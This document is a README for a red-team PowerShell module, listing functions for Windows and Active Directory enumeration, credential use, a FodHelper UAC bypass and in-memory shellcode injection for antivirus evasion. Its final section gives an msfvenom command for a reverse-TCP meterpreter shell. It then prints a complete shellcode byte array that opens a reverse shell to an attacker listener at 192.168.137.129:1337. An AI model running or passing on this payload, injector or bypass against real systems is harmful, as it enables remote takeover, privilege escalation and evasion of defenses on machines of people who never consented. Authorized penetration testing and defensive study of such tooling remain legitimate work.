# PowerShell-Red-Team-Enum
Collection of PowerShell functions a Red Teamer may use to collect data from a machine or gain access to a target. I added ps1 files for the commands that are included in the RedTeamEnum module. This will allow you to easily find and use only one command if that is all you want. If you want the entire module perform the following actions after downloading the RedTeamEnum directory and contents to your device.
```powershell
C:\PS> robocopy .\RedTeamEnum $env:USERPROFILE\Documents\WindowsPowerShell\Modules\RedTeamEnum *
# This will copy the module to a location that allows you to easily import it. If you are using OneDrive sync you may need to use $env:USERPROFILE\OneDrive\Documents\WindowsPowerShell\Modules\RedTeamEnum instead.

C:\PS> Import-Module -Name RedTeamEnum -Verbose
# This will import all the commands in the module. 

C:\PS> Get-Command -Module RedTeamEnum
# This will list all the commands in the module.
```

- Convert-Base64.psm1 is a function as the name states for encoding and/or decoding text into Base64 format.
```powershell
C:\PS> Convert-Base64 -Value "Convert me to base64!" -Encode

C:\PS> Convert-Base64 -Value "Q29udmVydCBtZSB0byBiYXNlNjQh" -Decode
```

- Convert-SID.ps1 is a function that converts SID values to usernames and usernames to SID values
```powershell
C:\PS> Convert-SID -Username tobor
# The above example converts tobor its SID value

C:\PS> Convert-SID -SID S-1-5-21-2860287465-2011404039-792856344-500
# The above value converts the SID value to its associated username
```

- Get-LdapInfo is a function I am very proud of for performing general LDAP queries. Although only two properties will show in the output, all of the properties associated with object can be seen by piping to Select-Object -Property * or using the -Detailed switch parameter.
```powershell
C:\PS> Get-LdapInfo -Detailed -SPNNamedObjects
# The above returns all the properties of the returned objects
#
C:\PS> Get-LdapInfo -DomainControllers | Select-Object -Property 'Name','ms-Mcs-AdmPwd'
# If this is run as admin it will return the LAPS password for the local admin account
#
C:\PS> Get-LdapInfo -ListUsers | Where-Object -Property SamAccountName -like "user.samname"
# NOTE: If you include the "-Detailed" switch and pipe the output to where-object it will not return any properties. If you wish to display all the properties of your result it will need to be carried out using the below format
#
C:\PS> Get-LdapInfo -AllServers | Where-Object -Property LogonCount -gt 1 | Select-Object -Property * 
 
```

- Get-NetworkShareInfo is a cmdlet that is used to retrieve information and/or brute force discover network shares available on a remote or local machine
```powershell
C:\PS> Get-NetworkShareInfo -ShareName C$
# The above example returns information on the share C$ on the local machine
#RESULTS
Name         : C$
InstallDate  :
Description  : Default share
Path         : C:\
ComputerName : TOBORDESKTOP
Status       : OK

C:\PS> Get-NetworkShareInfo -ShareName NETLOGON,SYSVOL,C$ -ComputerName DC01.domain.com, DC02.domain.com, 10.10.10.1
# The above example disocvers and returns information on NETLOGON, SYSVOL, and C$ on the 3 remote devices DC01, DC02, and 10.10.10.1
```

- Test-PrivEsc is a function that can be used for finding whether WSUS updates over HTTP are vulnerable to PrivEsc, Clear Text credentials are stored in common places,  AlwaysInstallElevated is vulnerable to PrivEsc, Unquoted Service Paths exist, and enum of possible weak write permissions for services.
```powershell
 C:\PS> Test-PrivEsc
```

- Get-InitialEnum is a function for enumerating the basics of a Windows Operating System to help better display possible weaknesses.
```powershell
 C:\PS> Get-InitialEnum
```

- Start-SimpleHTTPServer is a function used to host an HTTP server for downloading files. It is meant to be similart to pythons SimpleHTTPServer module. Directories are not traversable through the web server. The files that will be hosted for download will be from the current directory you are in when issuing this command.
```powershell
C:\PS> Start-SimpleHTTPServer
Open HTTP Server on port 8000

#OR
C:\PS> Start-SimpleHTTPServer -Port 80
# Open HTTP Server on port 80
```

- Invoke-PortScan.ps1 is a function for scanning all possible TCP ports on a target. I will improve in future by including UDP as well as the ability to define a port range. This one is honestly not even worth using because it is very slow. Threading is a weak area of mine and I plan to work on that with this one.
```powershell
 C:\PS> Invoke-PortScan -IpAddress 192.168.0.1
```

- Invoke-PingSweep is a function used for performing a ping sweep of a subnet range. 
```powershell
Invoke-PingSweep -Subnet 192.168.1.0 -Start 192 -End 224 -Source Singular
# NOTE: The source parameter only works if IP Source Routing value is "Yes"

Invoke-PingSweep -Subnet 10.0.0.0 -Start 1 -End 20 -Count 2
# Default value for count is 1

Invoke-PingSweep -Subnet 172.16.0.0 -Start 64 -End 128 -Count 3 -Source Multiple
```

- Invoke-UseCreds is a function I created to simplify the process of using obtained credentials during a pen test. I use -Passwd instead of -Password because that parameter when defined should be configured as a secure string which is not the case when entering a value into that filed with this function. It gets converted to a secure string after you set that value.
```powershell
# The below command will use the entered credentials to open the msf.exe executable as the user tobor
Invoke-UseCreds -Username 'OsbornePro\tobor' -Passwd 'P@ssw0rd1' -Path .\msf.exe -Verbose
```

- Invoke-FodHelperBypass is a function that tests whether or not the UAC bypass will work before executing it to elevate priviledges. This of course needs to be run by a member of the local administrators group as this bypass elevates the priviledges of the shell you are in. You can define the program to run which will allow you to execute generaate msfvenom payloads as well as cmd or powershell or just issuing commands.
```powershell
Invoke-FodHelperBypass -Program "powershell" -Verbose
# OR 
Invoke-FodHelperBypass -Program "cmd /c msf.exe" -Verbose
```

- Invoke-InMemoryPayload is used for AV Evasion using an In-Memory injection. This will require the runner to generate an msfvenom payload using a command similar to the example below, and entering the "[Byte[]] $buf" variable into Invoke-InMemoryPayloads "ShellCode" parameter.
```bash
# Generate payload to use
msfvenom -p windows/meterpreter/shell_reverse_tcp LHOST=192.168.137.129 LPORT=1337 -f powershell
```
Start a listener, use that value in the "ShellCode" parameter, and run the command to gain your shell. This will also require certain memory protections to not be enabled. 
__NOTE:__ Take note there are __NOT ANY DOUBLE QUOTES__ around the ShellCode variables value. This is because it is expecting a byte array.
```powershell
Invoke-InMemoryPayload -Payload 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0xf,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x1,0xd0,0x8b,0x80,0x88,0x0,0x0,0x0,0x48,0x85,0xc0,0x74,0x67,0x48,0x1,0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x1,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x1,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x3,0x4c,0x24,0x8,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x1,0xd0,0x66,0x41,0x8b,0xc,0x48,0x44,0x8b,0x40,0x1c,0x49,0x1,0xd0,0x41,0x8b,0x4,0x88,0x48,0x1,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x0,0x0,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x1,0x0,0x0,0x49,0x89,0xe5,0x49,0xbc,0x2,0x0,0x5,0x39,0xc0,0xa8,0x89,0x81,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x7,0xff,0xd5,0x4c,0x89,0xea,0x68,0x1,0x1,0x0,0x0,0x59,0x41,0xba,0x29,0x80,0x6b,0x0,0xff,0xd5,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0xf,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,0x99,0xa5,0x74,0x61,0xff,0xd5,0x48,0x81,0xc4,0x40,0x2,0x0,0x0,0x49,0xb8,0x63,0x6d,0x64,0x0,0x0,0x0,0x0,0x0,0x41,0x50,0x41,0x50,0x48,0x89,0xe2,0x57,0x57,0x57,0x4d,0x31,0xc0,0x6a,0xd,0x59,0x41,0x50,0xe2,0xfc,0x66,0xc7,0x44,0x24,0x54,0x1,0x1,0x48,0x8d,0x44,0x24,0x18,0xc6,0x0,0x68,0x48,0x89,0xe6,0x56,0x50,0x41,0x50,0x41,0x50,0x41,0x50,0x49,0xff,0xc0,0x41,0x50,0x49,0xff,0xc8,0x4d,0x89,0xc1,0x4c,0x89,0xc1,0x41,0xba,0x79,0xcc,0x3f,0x86,0xff,0xd5,0x48,0x31,0xd2,0x48,0xff,0xca,0x8b,0xe,0x41,0xba,0x8,0x87,0x1d,0x60,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,0x28,0x3c,0x6,0x7c,0xa,0x80,0xfb,0xe0,0x75,0x5,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x0,0x59,0x41,0x89,0xda,0xff,0xd5 -Verbose
```
![Invoke-InMemoryPayload Image](https://raw.githubusercontent.com/tobor88/PowerShell-Red-Team/master/InvokeInMemPayloadImg.png)
